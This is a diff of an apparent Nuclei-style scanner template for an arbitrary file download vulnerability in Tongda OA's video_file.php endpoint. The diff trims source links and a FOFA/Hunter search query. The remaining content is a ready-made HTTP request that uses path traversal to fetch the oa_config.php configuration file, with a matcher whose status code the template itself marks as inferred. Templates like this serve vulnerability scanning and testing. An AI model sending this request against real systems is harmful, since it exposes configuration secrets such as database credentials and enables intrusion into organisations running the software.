@@ -3,14 +3,8 @@ info:
   name: 通达OAvideo_file.php任意文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e6f69e932c20e0dd4ec14b1f8f77ad9c
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: e6f69e932c20e0dd4ec14b1f8f77ad9c
-    fofa: + hunter`app.name="通达 OA"`
 http:
 - raw:
   - 'GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1
